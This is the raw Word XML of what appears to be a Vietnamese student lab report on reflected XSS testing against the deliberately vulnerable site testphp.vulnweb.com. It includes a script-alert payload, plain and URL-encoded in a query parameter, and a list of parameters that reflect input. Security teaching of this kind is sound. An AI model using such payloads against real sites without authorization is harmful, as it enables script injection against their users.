        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ham số đầu vào xác định:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>search</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, hoặc </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> tùy thuộc vào trang</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="422D4DC9">
      <w:pPr>
        <w:pStyle w:val="85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eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Giá trị đầu vào xuất hiện trong trang kết quả:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Có, trong phần kết quả tìm kiếm hoặc phản hồi HTML</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70AC28A5">
      <w:pPr>
        <w:pStyle w:val="85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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Bước kiểm thử &amp; phán đoán:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04D15A4E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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3BB6A9F4">
      <w:pPr>
        <w:pStyle w:val="85"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl/>
        <w:suppressLineNumbers w:val="0"/>
        <w:spacing w:before="0" w:beforeAutospacing="1" w:after="0" w:afterAutospacing="1"/>
        <w:ind w:right="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 xml:space="preserve">Truy cập </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>http://testphp.vulnweb.com/artists.php?artist=1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68AB2EF4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&lt;script&gt;alert('0271')&lt;/script&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E138A28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http://testphp.vulnweb.com/artists.php?artist=%3Cscript%3Ealert(%270271%27)%3C/script%3E</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FB947D0">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66553072">
      <w:pPr>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0426BE2F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B8EE1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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E9A3E19">
      <w:pPr>
        <w:pStyle w:val="85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  <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Giải thích:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:br w:type="textWrapping"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Server không lọc đầu vào → in trực tiếp vào HTML trả về, dẫn đến thực thi script độc hại.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49C71771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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12F5E811">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Câu 2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35877D88">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Thực hiện kiểm thử lỗ hổng XSS để thực thi đoạn mã hiển thị thông báo có chứa tên của sinh viên.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6AC0BE">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
        <w:t>Điểm cho mỗi tham số đầu vào đã kiểm thử được:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="305F163B">
      <w:pPr>
        <w:pStyle w:val="85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eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Tham số đầu vào:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>search</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>message</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="44"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>comment</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> (tùy thuộc trang web)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15C06427">
      <w:pPr>
        <w:pStyle w:val="85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eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Giá trị đầu vào xuất hiện trong trang kết quả:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> Có (xuất hiện lại trong form/comment/result page)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287D9C93">
      <w:pPr>
        <w:pStyle w:val="85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sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="92"/>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Bước kiểm thử:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09E32D72">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12091B0F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1241">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:lang w:val="vi-VN"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:hint="default" w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="SimSun" w:cs="Times New Roman"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>Đầu vào không được encode → XSS reflected.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0">
    <w:nsid w:val="71D32C1A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="71D32C1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11">
    <w:nsid w:val="7CFF6133"/>
    <w:multiLevelType w:val="singleLevel"/>
    <w:tmpl w:val="7CFF613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3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EC4164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4CEC4164"/>
    <w:rsid w:val="5A676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qFormat="1"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qFormat="1" w:unhideWhenUsed="0" w:uiPriority="0" w:semiHidden="0" w:name="toc 6"/>
    <w:lsdException w:unhideWhenUsed="0" w:uiPriority="0" w:semiHidden="0" w:name="toc 7"/>
    <w:lsdException w:qFormat="1"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qFormat="1"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qFormat="1"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qFormat="1"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qFormat="1"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qFormat="1"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qFormat="1"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qFormat="1" w:unhideWhenUsed="0" w:uiPriority="0" w:semiHidden="0" w:name="Table Classic 4"/>
    <w:lsdException w:unhideWhenUsed="0" w:uiPriority="0" w:semiHidden="0" w:name="Table Colorful 1"/>
    <w:lsdException w:qFormat="1"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qFormat="1"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qFormat="1"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unhideWhenUsed="0" w:uiPriority="60" w:semiHidden="0" w:name="Light Shading"/>
    <w:lsdException w:qFormat="1" w:unhideWhenUsed="0" w:uiPriority="61" w:semiHidden="0" w:name="Light List"/>
    <w:lsdException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unhideWhenUsed="0" w:uiPriority="60" w:semiHidden="0" w:name="Light Shading Accent 1"/>
    <w:lsdException w:qFormat="1" w:unhideWhenUsed="0" w:uiPriority="61" w:semiHidden="0" w:name="Light List Accent 1"/>
    <w:lsdException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uiPriority w:val="0"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="44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uiPriority w:val="0"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="46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uiPriority w:val="0"/>
    <w:rPr>
      <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri" w:eastAsia="Calibri"/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2">
    <w:name w:val="index 1"/>
    <w:basedOn w:val="1"/>
    <w:next w:val="1"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uiPriority w:val="0"/>
    <w:pPr>
      <w:ind w:left="400" w:leftChars="400"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="55">
    <w:name w:val="index 4"/>
    <w:basedOn w:val="1"/>
    <w:next w:val="1"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uiPriority w:val="0"/>
    <w:pPr>
      <w:ind w:left="1400" w:leftChars="1400"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="60">
    <w:name w:val="index 9"/>
    <w:basedOn w:val="1"/>
    <w:next w:val="1"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uiPriority w:val="0"/>
    <w:pPr>
      <w:ind w:left="100" w:leftChars="400" w:hanging="200" w:hangingChars="200"/>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="66">
    <w:name w:val="List 4"/>
    <w:basedOn w:val="1"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uiPriority w:val="0"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="0"/>
        <w:numId w:val="1"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="69">
    <w:name w:val="List Bullet 2"/>
    <w:basedOn w:val="1"/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="0"/>
        <w:numId w:val="2"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="70">
    <w:name w:val="List Bullet 3"/>
    <w:basedOn w:val="1"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uiPriority w:val="0"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="0"/>
        <w:numId w:val="6"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="79">
    <w:name w:val="List Number 2"/>
    <w:basedOn w:val="1"/>
    <w:uiPriority w:val="0"/>
    <w:pPr>
      <w:numPr>
        <w:ilvl w:val="0"/>
        <w:numId w:val="7"/>
      </w:numPr>
    </w:pPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="80">
    <w:name w:val="List Number 3"/>
    <w:basedOn w:val="1"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uiPriority w:val="0"/>
    <w:rPr>
      <w:sz w:val="24"/>
      <w:szCs w:val="24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2025-04-25T06:34:00Z</dcterms:created>
  <dc:creator>LEN</dc:creator>
  <cp:lastModifiedBy>LEN</cp:lastModifiedBy>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-04-25T08:06:23Z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E2A144950A39408794F49E75F16A32D4_11</vt:lpwstr>
  </property>
</Properties>
</file>